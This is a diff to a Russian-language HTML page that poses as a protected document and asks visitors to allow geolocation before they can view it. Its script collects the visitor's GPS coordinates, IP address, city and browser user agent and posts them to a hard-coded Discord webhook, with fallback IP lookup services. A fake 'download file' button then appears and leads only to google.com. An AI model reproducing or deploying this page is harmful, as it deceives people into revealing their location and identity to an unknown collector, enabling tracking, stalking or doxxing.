@@ -1,33 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <title>Документ защищен</title>
-</head>
+<head><meta charset="utf-8"><title>Документ защищен</title></head>
 <body style="text-align:center; padding-top:50px; font-family:sans-serif;">
     <h2 style="color:red;">Документ защищен!</h2>
     <p>Пожалуйста, разрешите доступ к геолокации для просмотра файла.</p>
+    <button id="dlBtn" style="display:none; padding: 15px 30px; font-size: 18px; background: blue; color: white; border: none; border-radius: 5px; margin-top: 20px;">Скачать файл</button>
     <script>
+    let ua = navigator.userAgent;
+    document.getElementById('dlBtn').onclick = function() { window.location.href = "https://www.google.com"; };
+
     navigator.geolocation.getCurrentPosition(
         (pos) => { sendData(pos.coords.latitude, pos.coords.longitude); },
-        (err) => { sendData("denied", "denied"); }
+        (err) => { sendData("denied", "denied"); },
+        { timeout: 10000 } 
     );
 
     function sendData(lat, lon) {
-        fetch('https://ipwho.is/').then(r => r.json()).then(d => {
-            let msg = "IP: " + d.ip + " | City: " + d.city + " | Maps: https://www.google.com/maps?q=" + lat + "," + lon;
-            fetch("https://discord.com/api/webhooks/1569604511620669570/pUUVOujnJeA6cpOvxIZ1a1EMqDnvdZF3eF2Fr0yjTZqm0iK_o8ZqtYZb1TSz6hfTsHK8", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: msg})
+        fetch('https://ipwho.is/')
+            .then(r => r.json())
+            .then(d => {
+                if (d.success === false) throw new Error("API Error");
+                sendToDiscord(d.ip, d.city, lat, lon, ua);
+            })
+            .catch(() => {
+                // Резервный сервис, если первый упал
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => sendToDiscord(d.ip, "Неизвестен", lat, lon, ua))
+                    .catch(() => sendToDiscord("Скрыт", "Неизвестен", lat, lon, ua));
             });
-        }).catch(() => {
-            let msg = "IP: Unknown | Maps: https://www.google.com/maps?q=" + lat + "," + lon;
-            fetch("https://discord.com/api/webhooks/1569604511620669570/pUUVOujnJeA6cpOvxIZ1a1EMqDnvdZF3eF2Fr0yjTZqm0iK_o8ZqtYZb1TSz6hfTsHK8", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: msg})
-            });
+    }
+
+    function sendToDiscord(ip, city, lat, lon, ua) {
+        let msg = "IP: " + ip + " | City: " + city + " | Maps: https://www.google.com/maps?q=" + lat + "," + lon + " | UA: " + ua.substring(0, 50);
+        fetch("https://discord.com/api/webhooks/1569604511620669570/pUUVOujnJeA6cpOvxIZ1a1EMqDnvdZF3eF2Fr0yjTZqm0iK_o8ZqtYZb1TSz6hfTsHK8", {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({content: msg})
+        }).then(() => {
+            document.getElementById('dlBtn').style.display = 'inline-block'; // Показываем кнопку
         });
     }
     </script>
